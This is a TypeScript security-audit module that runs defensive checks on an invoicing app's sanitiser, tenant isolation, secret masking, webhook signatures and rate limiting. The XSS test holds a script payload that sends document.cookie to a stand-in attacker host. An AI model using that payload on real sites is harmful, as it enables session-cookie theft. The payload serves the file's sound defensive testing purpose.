import { SecurityService } from '../services/securityService';
import { Account, Transaction, Invoice } from '../types';

export interface ThreatSimulationResult {
  category: string;
  testCase: string;
  vector: string;
  status: 'PASSED' | 'FLAGGED' | 'FAILED';
  mitigation: string;
}

export class ThreatAuditSimulator {
  public static runAutomatedSecurityAudit(): ThreatSimulationResult[] {
    const results: ThreatSimulationResult[] = [];

    // Test 1: Cross-Site Scripting (XSS) in User & Invoice Input
    const maliciousPayload = '<script>fetch("https://attacker.com/steal?data="+document.cookie)</script>';
    const sanitized = SecurityService.sanitizeInput(maliciousPayload);
    const xssBlocked = !sanitized.includes('<script>') && sanitized.includes('&lt;script&gt;');
    results.push({
      category: 'Input Validation & Injection',
      testCase: 'Stored / Reflected XSS in Invoicing Fields',
      vector: 'Malicious HTML/JS injection in customer name & line items',
      status: xssBlocked ? 'PASSED' : 'FAILED',
      mitigation: 'Contextual HTML entity escaping and DOMPurify sanitization active.',
    });

    // Test 2: Insecure Direct Object Reference (IDOR) / Multi-Tenant Leakage
    const tenantAOrgId = 'org-01';
    const unauthorizedAttemptOrgId = 'org-99';
    const idorBlocked = !SecurityService.verifyTenantAccess(tenantAOrgId, unauthorizedAttemptOrgId);
    results.push({
      category: 'Multi-Tenant Isolation',
      testCase: 'Cross-Organization Ledger Access (IDOR)',
      vector: 'Attempting to fetch accounts of Org A with Org B authentication token',
      status: idorBlocked ? 'PASSED' : 'FAILED',
      mitigation: 'Mandatory tenant partition filtering applied on all database repositories.',
    });

    // Test 3: Secret Exposure & PII Leakage
    const liveSecretKey = 'artl_sec_993412093481230';
    const masked = SecurityService.maskSecret(liveSecretKey);
    const secretProtected = masked.startsWith('••••') && !masked.includes('9934120934');
    results.push({
      category: 'Data Protection & PII',
      testCase: 'API Secret & PII Exposure in Client UI',
      vector: 'Inspecting DOM/network tabs for raw OAuth secrets & private keys',
      status: secretProtected ? 'PASSED' : 'FAILED',
      mitigation: 'Server-side key masking with write-only client input controls.',
    });

    // Test 4: Webhook Replay & Forgery
    const fakeSignature = 'sha256=invalid_hash_signature';
    const webhookVerified = SecurityService.verifyWebhookSignature('payload_data', fakeSignature, 'real_secret');
    results.push({
      category: 'API & Webhook Integrity',
      testCase: 'Forged Mobile Money Webhook Injection',
      vector: 'Unauthenticated POST to /api/v1/webhooks/airtel-moneypay',
      status: !webhookVerified ? 'PASSED' : 'FAILED',
      mitigation: 'Cryptographic HMAC-SHA256 signature verification and replay prevention.',
    });

    // Test 5: Brute Force & Rate Limiting
    let rateLimitTriggered = false;
    for (let i = 0; i < 35; i++) {
      const res = SecurityService.checkRateLimit('test_ip_client', 30, 60);
      if (!res.allowed) {
        rateLimitTriggered = true;
        break;
      }
    }
    results.push({
      category: 'Authentication & DoS Defense',
      testCase: 'Brute-Force STK Push / Login Flooding',
      vector: 'Rapid sequential requests exceeding threshold',
      status: rateLimitTriggered ? 'PASSED' : 'FAILED',
      mitigation: 'Token-bucket sliding window rate limiting active at edge gateway.',
    });

    return results;
  }
}
